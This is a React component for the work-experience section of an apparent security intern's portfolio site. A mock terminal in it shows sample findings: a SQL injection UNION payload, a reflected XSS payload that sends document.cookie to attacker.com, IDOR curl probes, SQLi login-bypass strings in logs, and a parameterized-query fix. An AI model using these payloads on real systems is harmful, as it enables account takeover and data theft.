"use client";

import React, { useState } from "react";
import { Terminal, Calendar, ShieldAlert, CheckCircle, Cpu } from "lucide-react";

export default function Experience() {
  const [activeTaskLog, setActiveTaskLog] = useState<"scan" | "owasp" | "logs" | "remediation">("scan");

  const responsibilities = [
    { title: "Vulnerability Assessments", desc: "Executed comprehensive automated and manual security scans utilizing Burp Suite Professional and Nessus to uncover logical flaws and application defects." },
    { title: "OWASP Top 10 Testing", desc: "Successfully simulated offensive security attacks targeting injection flaws (SQLi, XSS), broken authorization (IDOR), and request forgery configurations (CSRF)." },
    { title: "Behavioral & Log Analysis", desc: "Analyzed network requests and security events to understand malicious patterns, tracking trace indicators in standard server logs." },
    { title: "Security Remediation Support", desc: "Authored professional technical briefs outlining identified threats, mitigation procedures, and secure code snippets for developer teams." }
  ];

  const renderLogContent = () => {
    switch (activeTaskLog) {
      case "scan":
        return (
          <>
            <div className="text-[#ff5353] font-bold mb-1">// BURP_SUITE_SCAN_RESULT.LOG</div>
            <div className="text-neutral-500 mb-2">TARGET: https://staging.internal-app.local</div>
            <div className="space-y-1">
              <div className="flex items-center gap-1.5 text-red-400">
                <ShieldAlert className="w-3.5 h-3.5" />
                <span>[HIGH] SQL Injection payload accepted at /api/users/profile [id=1]</span>
              </div>
              <div className="text-neutral-400 pl-5">└─ Payload: 1' UNION SELECT NULL, username, password_hash FROM users--</div>
              <div className="flex items-center gap-1.5 text-yellow-400 mt-1">
                <ShieldAlert className="w-3.5 h-3.5" />
                <span>[MEDIUM] Cross-Site Scripting (Reflected XSS) at /search?q=</span>
              </div>
              <div className="text-neutral-400 pl-5">└─ Payload: &lt;script&gt;fetch('http://attacker.com/stealer?cookie='+document.cookie)&lt;/script&gt;</div>
              <div className="flex items-center gap-1.5 text-green-400 mt-2">
                <CheckCircle className="w-3.5 h-3.5" />
                <span>[INFO] Security Assessment scan completed. 2 issues identified.</span>
              </div>
            </div>
          </>
        );
      case "owasp":
        return (
          <>
            <div className="text-[#ff5353] font-bold mb-1">// OWASP_ATTACK_SIMULATION.SH</div>
            <div className="text-neutral-500 mb-2">LAUNCHING ATTACK CYCLE — IDOR & CSRF</div>
            <div className="space-y-1">
              <div>$ curl -X GET "https://api.app.local/v1/accounts/10204" -H "Authorization: Bearer [User_Token]"</div>
              <div className="text-red-400 pl-2">⚡ Response: 200 OK (Contains account data for user 10204)</div>
              
              <div className="mt-2">$ curl -X GET "https://api.app.local/v1/accounts/10205" -H "Authorization: Bearer [User_Token]"</div>
              <div className="text-red-400 pl-2">🚨 Alert IDOR: 200 OK (Vulnerability Confirmed: Unauthorised data access for user 10205)</div>
 
              <div className="flex items-center gap-1.5 text-green-400 mt-2">
                <CheckCircle className="w-3.5 h-3.5" />
                <span>IDOR vector registered. Mapped to CWE-639. Severity: High.</span>
              </div>
            </div>
          </>
        );
      case "logs":
        return (
          <>
            <div className="text-[#ff5353] font-bold mb-1">// LOG_PATTERN_DETECTION.CFG</div>
            <div className="text-neutral-500 mb-2">SEARCHING FOR MALICIOUS LOG SIGNATURES...</div>
            <div className="space-y-1 bg-black/50 p-2 rounded border border-neutral-900">
              <div className="text-[10px] text-neutral-500">127.0.0.1 - - [28/Feb/2025:14:10:04] "GET /products/details.php?id=999%20OR%201=1 HTTP/1.1" 200 4820</div>
              <div className="text-[10px] text-red-400/90 font-bold">└─ [!] WARNING: Blind SQLi attempt detected (OR 1=1 signature match)</div>
              <div className="text-[10px] text-neutral-500 mt-1">127.0.0.1 - - [28/Feb/2025:14:10:20] "POST /login HTTP/1.1" 401 204 (Invalid username=' OR 'x'='x)</div>
              <div className="text-[10px] text-red-400/90 font-bold">└─ [!] ALERT: SQL Bypass login attempt detected</div>
            </div>
          </>
        );
      case "remediation":
        return (
          <>
            <div className="text-[#ff5353] font-bold mb-1">// REMEDIATION_ADVISORY.MD</div>
            <div className="text-neutral-500 mb-2">FIX: PREVENTING SQL INJECTION (INPUT PARAMETERIZATION)</div>
            <div className="space-y-2 text-[10px]">
              <div className="text-red-400 font-bold">// INSECURE DIRECT SQL CONCATENATION (DO NOT USE)</div>
              <div className="bg-red-950/20 text-red-300 p-2 rounded border border-red-500/20 font-mono">
                db.Query("SELECT * FROM users WHERE id = '" + inputID + "'")
              </div>
              <div className="text-green-400 font-bold">// SECURE PARAMETERIZED PREPARED STATEMENT</div>
              <div className="bg-green-950/20 text-green-300 p-2 rounded border border-green-500/20 font-mono">
                db.Query("SELECT * FROM users WHERE id = ?", inputID)
              </div>
            </div>
          </>
        );
    }
  };

  return (
    <section id="experience" className="py-24 border-b border-neutral-900 relative">
      <div className="absolute inset-0 cyber-grid-dots opacity-10 pointer-events-none" />

      <div className="max-w-7xl mx-auto px-4 md:px-6 relative z-10">
        
        {/* Section Header */}
        <div className="flex flex-col mb-16">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white tracking-tight uppercase">
            WORK <span className="text-[#ff5353]">EXPERIENCE</span>
          </h2>
          <div className="w-12 h-[2px] bg-[#ff5353] mt-2" />
        </div>

        {/* Experience visual block */}
        <div className="grid grid-cols-1 lg:grid-cols-5 gap-8 items-stretch">
          
          {/* Timeline Card details */}
          <div className="lg:col-span-2 flex flex-col justify-between">
            <div className="bg-neutral-950/40 p-6 rounded-xl border border-neutral-900 relative flex flex-col justify-between h-full shadow-lg">
              <div className="absolute top-0 left-0 w-3.5 h-3.5 border-t-2 border-l-2 border-[#ff5353]/30" />
              <div className="absolute bottom-0 right-0 w-3.5 h-3.5 border-b-2 border-r-2 border-[#ff5353]/30" />

              <div className="space-y-6">
                <div>
                  <div className="flex items-center gap-1.5 font-sans text-[10px] text-[#ff5353] font-bold mb-2">
                    <Calendar className="w-3.5 h-3.5" />
                    DURATION: 02/2025 – 03/2025
                  </div>
                  <h3 className="text-xl font-black text-white">
                    Cyber Security & Penetration Testing Intern
                  </h3>
                  <div className="font-sans text-xs text-neutral-400 font-bold tracking-wider mt-1">
                    HACKTIFY
                  </div>
                </div>

                <div className="border-t border-neutral-900 pt-5 space-y-4">
                  {responsibilities.map((resp, i) => (
                    <div key={i} className="flex gap-2 text-xs">
                      <div className="w-1.5 h-1.5 rounded-full bg-[#ff5353] mt-1 flex-shrink-0 animate-pulse" />
                      <div className="space-y-0.5">
                        <span className="font-bold text-neutral-200">{resp.title}:</span>{" "}
                        <span className="text-neutral-400 leading-relaxed">{resp.desc}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="font-mono text-[8px] text-neutral-600 mt-8 border-t border-neutral-900 pt-4 flex items-center justify-between">
                <span>SECURITY LEVEL: ASSESSOR</span>
                <span>STATE: COMPLETED</span>
              </div>
            </div>
          </div>

          {/* Interactive Terminal Sandbox showing logs */}
          <div className="lg:col-span-3">
            <div className="h-full bg-black border border-neutral-900 rounded-xl overflow-hidden flex flex-col shadow-2xl relative">
              
              {/* Terminal Top tab bar */}
              <div className="bg-neutral-950 px-4 py-3 border-b border-neutral-900 flex flex-col sm:flex-row items-center justify-between gap-3 font-mono">
                <div className="flex items-center gap-2">
                  <Terminal className="w-3.5 h-3.5 text-[#ff5353]" />
                  <span className="text-[10px] text-neutral-400 font-semibold tracking-wider">
                    CONSOLE_WORKSPACE // sridhar@hacktify
                  </span>
                </div>

                {/* Workspace tab buttons */}
                <div className="flex items-center gap-1 p-0.5 bg-black rounded-lg border border-neutral-900 text-[8px]">
                  <button
                    onClick={() => setActiveTaskLog("scan")}
                    className={`px-2.5 py-1 rounded transition-colors cursor-pointer ${
                      activeTaskLog === "scan" ? "bg-[#ff5353]/15 text-[#ff5353] font-bold border border-[#ff5353]/35" : "text-neutral-500 hover:text-neutral-300"
                    }`}
                  >
                    BURP SCAN
                  </button>
                  <button
                    onClick={() => setActiveTaskLog("owasp")}
                    className={`px-2.5 py-1 rounded transition-colors cursor-pointer ${
                      activeTaskLog === "owasp" ? "bg-[#ff5353]/15 text-[#ff5353] font-bold border border-[#ff5353]/35" : "text-neutral-500 hover:text-neutral-300"
                    }`}
                  >
                    OWASP SIM
                  </button>
                  <button
                    onClick={() => setActiveTaskLog("logs")}
                    className={`px-2.5 py-1 rounded transition-colors cursor-pointer ${
                      activeTaskLog === "logs" ? "bg-[#ff5353]/15 text-[#ff5353] font-bold border border-[#ff5353]/35" : "text-neutral-500 hover:text-neutral-300"
                    }`}
                  >
                    LOG SEARCH
                  </button>
                  <button
                    onClick={() => setActiveTaskLog("remediation")}
                    className={`px-2.5 py-1 rounded transition-colors cursor-pointer ${
                      activeTaskLog === "remediation" ? "bg-[#ff5353]/15 text-[#ff5353] font-bold border border-[#ff5353]/35" : "text-neutral-500 hover:text-neutral-300"
                    }`}
                  >
                    REMEDIATION
                  </button>
                </div>
              </div>

              {/* Console log outputs */}
              <div className="flex-1 p-5 font-mono text-[10.5px] leading-relaxed bg-[#020205] min-h-[220px] md:min-h-0 overflow-y-auto scrollbar-thin">
                {renderLogContent()}
              </div>

              {/* Console Prompt line footer */}
              <div className="bg-neutral-950 px-4 py-2 border-t border-neutral-900 text-[10px] font-mono text-neutral-500 flex items-center justify-between">
                <span className="flex items-center gap-1">
                  <Cpu className="w-3 h-3 text-[#ff5353] animate-pulse" />
                  <span>AUDIT MODE: READ_ONLY</span>
                </span>
                <span>STATUS: SECURE_OUTPUT</span>
              </div>

            </div>
          </div>

        </div>

      </div>
    </section>
  );
}
